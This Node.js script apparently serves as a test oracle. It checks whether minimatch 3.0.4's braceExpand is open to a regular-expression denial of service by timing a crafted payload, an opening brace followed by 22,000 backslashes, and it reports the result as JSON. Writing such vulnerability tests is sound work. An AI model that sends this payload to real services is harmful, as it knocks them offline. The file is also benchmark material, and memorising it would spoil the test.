const minimatch = require('minimatch');

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

try {
  // Benign operation: verify public API works as expected.
  const benign = minimatch.braceExpand('a{b,c}d');
  if (!Array.isArray(benign) || benign.length !== 2 || benign[0] !== 'abd' || benign[1] !== 'acd') {
    throw new Error('benign braceExpand produced unexpected output');
  }

  // Mark completed only after successful benign call.
  operation_completed = true;

  // ReDoS trigger shape for vulnerable /\{.*\}/ check in braceExpand.
  // Run multiple times with bounded size to amplify timing difference while staying quick.
  const payload = '{'.concat('\\'.repeat(22000));
  const rounds = 6;

  let totalMs = 0;
  for (let i = 0; i < rounds; i++) {
    const t0 = Date.now();
    minimatch.braceExpand(payload);
    totalMs += (Date.now() - t0);
  }

  // Threshold chosen to separate vulnerable 3.0.4 (slow) from patched 3.0.5 (fast) in aggregate.
  const thresholdMs = 120;
  exploit_succeeded = totalMs >= thresholdMs;
  evidence = 'total_ms=' + totalMs + ';rounds=' + rounds + ';payload_len=' + payload.length + ';threshold_ms=' + thresholdMs;
} catch (err) {
  if (!operation_completed) {
    evidence = 'setup_or_benign_error=' + (err && err.message ? err.message : String(err));
  } else {
    // Malicious-path exceptions count as blocked only after successful benign setup.
    exploit_succeeded = false;
    evidence = 'malicious_error=' + (err && err.name ? err.name : 'Error') + ';msg=' + (err && err.message ? err.message : String(err));
  }
}

console.log('ORACLE_RESULT ' + JSON.stringify({ operation_completed, exploit_succeeded, evidence }));